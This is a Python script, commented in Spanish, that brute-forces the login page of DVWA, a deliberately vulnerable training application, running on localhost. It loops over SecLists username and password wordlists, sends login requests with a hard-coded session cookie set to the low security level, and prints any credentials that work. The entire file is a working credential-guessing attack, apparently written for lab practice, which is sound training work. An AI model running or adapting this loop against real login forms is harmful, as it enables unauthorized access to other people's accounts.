import requests

def brute_force_dvwa(target_url, user_file, pass_file, session_cookie):
    valid_creds = []
    
    # Cabeceras esenciales (incluye cookies y user-agent)
    headers = {
        'Cookie': f'PHPSESSID={session_cookie}; security=low',
        'User-Agent': 'DVWA BruteForcer/1.0'
    }

    # Leer listas desde archivos
    try:
        with open(user_file, 'r') as f:
            users = [line.strip() for line in f.readlines()]
        
        with open(pass_file, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
            
    except FileNotFoundError as e:
        print(f'[-] Error: {e}')
        return []

    # Ataque de fuerza bruta
    for user in users:
        for password in passwords:
            params = {
                'username': user,
                'password': password,
                'Login': 'Login'
            }
            
            try:
                response = requests.get(
                    f'{target_url}/vulnerabilities/brute/',
                    headers=headers,
                    params=params,
                    timeout=5
                )
                
                if 'Welcome to the password protected area' in response.text:
                    print(f'[+] Credenciales válidas: {user}:{password}')
                    valid_creds.append((user, password))
                    
            except Exception as e:
                print(f'[-] Error con {user}:{password} -> {e}')
    
    return valid_creds

if __name__ == '__main__':
    target = 'http://localhost:4280'  
    session_id = 'f019bda2b1a152b0d1f13755e2630776'  
    
    # Archivos de SecLists (rutas por defecto en Kali Linux)
    user_list = '/usr/share/seclists/Usernames/top-usernames-shortlist.txt'
    pass_list = '/usr/share/seclists/Passwords/darkweb2017-top100.txt'
    
    print('[+] Iniciando ataque...')
    found_creds = brute_force_dvwa(target, user_list, pass_list, session_id)
    
    print('\n[+] Resultados:')
    for user, passwd in found_creds:
        print(f' - Usuario: {user}\tContraseña: {passwd}')
